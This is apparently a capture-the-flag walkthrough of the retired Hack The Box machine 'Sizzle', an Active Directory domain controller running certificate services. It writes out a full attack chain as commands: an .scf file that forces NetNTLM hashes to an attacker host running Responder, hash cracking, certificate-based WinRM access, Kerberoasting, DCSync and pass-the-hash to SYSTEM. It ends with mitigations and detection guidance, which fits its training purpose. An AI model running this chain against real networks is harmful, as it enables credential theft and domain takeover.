---
machine: Sizzle
os: Windows
difficulty: Insane
platform: Hack The Box
category: Windows / Active Directory / ADCS
state: Retired
tags: [windows, active-directory, smb, scf, responder, adcs, kerberoasting, dcsync]
---

# Sizzle — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired according to HTB and public writeups; not verified with an HTB session.
> Method note: no flags, hashes or real credentials.

## TL;DR

DC `sizzle.htb.local` in the `HTB.LOCAL` domain. A writable directory on the `Department Shares` share allows a `.scf` file that forces the server to authenticate to a Responder; `amanda`'s NetNTLMv2 falls to `rockyou`. Port 88 is filtered from outside and WinRM with a password fails, so access uses a user certificate issued by `/certsrv` over WinRM 5986. Once inside, `mrlky` has an SPN and replication rights: Kerberoasting, cracking, `DCSync` and pass-the-hash to Administrator.

## Recon

```bash
nmap -p- -T4 -Pn -oA nmap_all <IP>
nmap -p21,53,80,135,139,443,445,464,593,636,3268,3269,5985,5986,9389,47001 -sCV -Pn -oA nmap_svc <IP>
```

```text
21/tcp    ftp           Microsoft ftpd (anonymous)
53/tcp    domain        Simple DNS Plus
80/tcp    http          Microsoft IIS 10.0
135/tcp   msrpc
139/tcp   netbios-ssn
443/tcp   ssl/http      Microsoft IIS 10.0
445/tcp   microsoft-ds
464/tcp   kpasswd5
593/tcp   ncacn_http
636/tcp   ssl/ldap
3268/tcp  ldap          Global Catalog
3269/tcp  ssl/ldap
5985/tcp  wsman
5986/tcp  wsmans
9389/tcp  adws
47001/tcp winrm
```

- The host is `SIZZLE`, FQDN `sizzle.htb.local`, domain `HTB.LOCAL`.
- **Port 88 is not reachable from the VPN**: Kerberoasting is done with Rubeus using network credentials, or after tunnelling 88/389.
- `/certsrv` returns 401 with NTLM authentication and `/certenroll` is published: ADCS is present.
- `Department Shares` is readable and `Users/Public` is writable.

```bash
printf '%s\n' '<IP> sizzle.htb.local HTB.LOCAL SIZZLE' | sudo tee -a /etc/hosts
```

## Enumeration

```bash
ftp -n <IP>
# user anonymous, empty password
netexec smb sizzle.htb.local -u guest -p '' --shares
smbclient -N //sizzle.htb.local/'Department Shares'
```

Anonymous FTP is empty and adds nothing. SMB does: `Department Shares` can be listed and `Users/Public` accepts guest writes. That combination is the foothold.

The website confirms the CA and the enrolment portal:

```bash
curl -I http://sizzle.htb.local/certsrv/
curl -s http://sizzle.htb.local/certenroll/ | head
```

## Foothold

### `.scf` + Responder

Create an `.scf` file pointing at an attacker UNC path:

```ini
[Shell]
Command=2
IconFile=\\192.0.2.10\share\icon.ico
[Taskbar]
Command=ToggleDesktop
```

Upload it to the writable directory:

```bash
smbclient -N //sizzle.htb.local/'Department Shares' \
  -D 'Users/Public' -c 'put icon.scf'
```

With Responder listening for SMB:

```bash
sudo responder -I tun0
```

When the server (or a user) opens the directory, Windows tries to resolve the icon and sends `HTB\amanda`'s NetNTLMv2 hash. Save and crack it:

```bash
hashcat -m 5600 amanda.netntlmv2 /usr/share/wordlists/rockyou.txt
# john amanda.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Result: `amanda:<PASS_AMANDA>`.

### A certificate for WinRM

Password logon to WinRM fails with an authorization-header error; the documented path is a user certificate:

```bash
openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr
```

Paste the CSR into `/certsrv` under `Request a certificate → advanced certificate request`, authenticate as `HTB\amanda`, and download the Base64 response as `certnew.cer`.

```bash
evil-winrm -i sizzle.htb.local -k amanda.key -c certnew.cer -S
```

`-S` forces SSL and uses 5986. The session is in **Constrained Language Mode** and AppLocker blocks user-writable paths; run tools from an allowed path (`C:\Windows\Temp`) or use a PowerShell v2/InstallUtil bypass.

The user flag is not in `amanda`'s profile: it is on `mrlky`'s desktop. Move laterally.

## Privilege escalation

### Kerberoasting mrlky

`mrlky` has the `http/sizzle` SPN and `DS-Replication-Get-Changes` plus `-All` (DCSync). Because 88 is filtered, Rubeus can request the ticket with Amanda's network credentials:

```powershell
.\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:<PASS_AMANDA> /domain:htb.local
```

Alternative with a tunnel to 88/389:

```bash
GetUserSPNs.py -request -dc-ip 127.0.0.1 htb.local/amanda
hashcat -m 13100 mrlky.spn /usr/share/wordlists/rockyou.txt
```

Result: `mrlky:<PASS_MRLKY>`.

### DCSync and pass-the-hash

```bash
secretsdump.py -just-dc-ntlm htb.local/mrlky:'<PASS_MRLKY>'@sizzle.htb.local
```

The output includes Administrator's NT hash (`<ADMIN_NT_HASH>`); it is not published. Pass-the-hash:

```bash
psexec.py -hashes :<ADMIN_NT_HASH> htb.local/Administrator@sizzle.htb.local
```

```text
nt authority\system
```

`wmiexec.py` or `crackmapexec smb ... -H <ADMIN_NT_HASH> -x ...` also work. The root flag is on Administrator's desktop.

## Evidence

- `nmap` with 5986/9389 and no reachable 88.
- `netexec smb ... --shares` showing `Department Shares` and writable `Users/Public`.
- `icon.scf` and the Responder capture for `HTB\amanda`, password redacted.
- CSR, Base64 certificate and a working `evil-winrm -S`.
- `Rubeus kerberoast` or `GetUserSPNs.py` for `mrlky`'s SPN.
- `secretsdump -just-dc-ntlm` and `psexec -hashes`, with no real hashes.

## Lessons learned

- An `.scf` does not execute code: it **forces authentication** to a UNC path. The primitive is the hash, not the file.
- A filtered port 88 does not prevent Kerberoasting: Rubeus can use a network logon, and the port can be tunnelled.
- A user certificate is enough for WinRM when the password fails authentication, even without a vulnerable ESC1 template.
- CLM and AppLocker are not the end: they force a different path and technique, not surrender.
- `mrlky` was not an administrator, but held replication rights: DCSync turns a user with an SPN into Domain Admin.

## Mitigations and detection

- Remove guest write access from shares; review `Department Shares` and `Users/Public`; block `.scf`/`.lnk` on share paths.
- Disable NTLM where possible and require SMB signing; monitor outbound SMB connections to uninventoried hosts.
- Review the CA: templates, enrolment and certificate authentication; do not issue user certificates to accounts that do not need them.
- Rotate `amanda`'s password, restrict `mrlky` and remove `DS-Replication-Get-Changes` from non-DC accounts.
- Detection: 5140/5145 on `Department Shares`; NTLM authentications to external IPs; 4769 with RC4 and a user SPN; 4662 with `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`; type 3 4624 from unusual hosts.
- MITRE: T1187, T1558.003, T1003.006, T1021.006, T1550.002.

## References

- <https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html>
- <https://axcheron.github.io/writeups/htb/sizzle>
- <https://omnisl4sh.github.io/2022/05/02/Sizzle.html>
- <https://www.hackthebox.com/machines/sizzle>
